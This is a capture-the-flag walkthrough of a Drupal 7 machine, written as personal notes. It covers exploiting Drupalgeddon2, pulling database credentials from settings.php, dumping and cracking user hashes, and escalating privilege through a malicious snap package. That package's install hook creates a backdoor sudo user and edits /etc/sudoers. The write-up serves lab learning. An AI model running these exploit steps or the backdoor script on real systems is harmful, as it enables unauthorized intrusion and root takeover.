
# Main points
* [#^6b0a8d|dirty_sock vulnerability (snap)](#5E6b0a8d%7Cdirty_sock%20vulnerability%20%28snap%29)
*  [#^dd1865|drupalgeddon2](#%5Edd1865%7Cdrupalgeddon2)

# Enumeration
As always we start with nmap and find these open ports

* 22/tcp open  ssh     OpenSSH 7.4 (protocol 2.0)
* 80/tcp open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)

We see that the webserver is running Drupal 7, let's look on google if there are known vulnerabilities for this version of Drupal.

We find this github repo named [Drupalgeddon2](https://github.com/dreadlocked/Drupalgeddon2)
and these exploits : ^dd1865

* https://www.exploit-db.com/exploits/44448

* https://www.exploit-db.com/exploits/44449

* https://www.exploit-db.com/exploits/44482
We try the metasploit module drupalgeddon
and we go to `sites/default/` we see settings.php and grab database creds

|Service|username|password|
|-----|-----|-----|
|mysql|drupaluser|CQHEy@9M\*m23gBVj|
|drupal hash|hash salt|4S4JNzmn8lq4rqErTvcFlV4irAJoNqUmYy_d24JEyns|

We connect to mysql database with our creds
```bash
mysql -u drupaluser -p CQHEy@9M*m23gBVj -e "show databases;"
```

![Pasted image 20210709023623.png](../Pasted%20image%2020210709023623.png) We see that we have a `drupal` database, we see that it has a `user` table, let's dump it.
```bash
mysql -u drupaluser -p CQHEy@9M*m23gBVj -D drupal -e 'select name,pass from users;'
```

We get the hash of `Brucetherealadmin`

|user|hash|
|----|----|
|brucetherealadmin|\$S\$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt|
let's crack the hash with John.

we get the password `booboo`, let's connect with ssh. We get the user flag.

# Priv Esc
### [dirty_sock vulnerability](https://initblog.com/2019/dirty-sock/)

^6b0a8d

Let's see if our user can run something as root with `sudo -l`
we can run `snap`
![Pasted image 20210709024313.png](../Pasted%20image%2020210709024313.png)

So to get root we have to install a malicious snap package and install it as root. Let's check [GTFOBins](https://gtfobins.github.io/gtfobins/snap/)
We need to install [fpm](https://github.com/jordansissel/fpm) to create our malicious snap package

We make our malicious script that will create a suer with sudo permissions

```bash
$ cat - > script
useradd hackerman -m -p '$6$oMAzzKTUH62kHvSC$rYnR4DAyvuLxTdH5QPSXXrNVqZlug.ZY2a.Q2hbBus4R6q57MAfQhrcPy/d/FRFRhUSdh1wO.3yn1nG/WVejq1' -s /bin/bash
usermod -aG sudo hackerman
echo "hackerman    ALL=(ALL:ALL) ALL" >> /etc/sudoers
```
Note: The encrypted password is generated with python `crypt.crypt("password")`

```bash
COMMAND=$(cat script)
cd $(mktemp -d)
mkdir -p meta/hooks
printf '#!/bin/sh\n%s; false' "$COMMAND" >meta/hooks/install
chmod +x meta/hooks/install
fpm -n pwn -s dir -t snap -a all meta
```
And then download it to the target with `curl` from python HTTP server.
![Pasted image 20210709025549.png](../Pasted%20image%2020210709025549.png)

On the victim machine we run 
```bash
sudo snap install pwn_1.0_all.snap --devmode
```
We wait for the installation, and we change the user
`su hackerman` we can sudo to `root`
We have root, and we get the flag.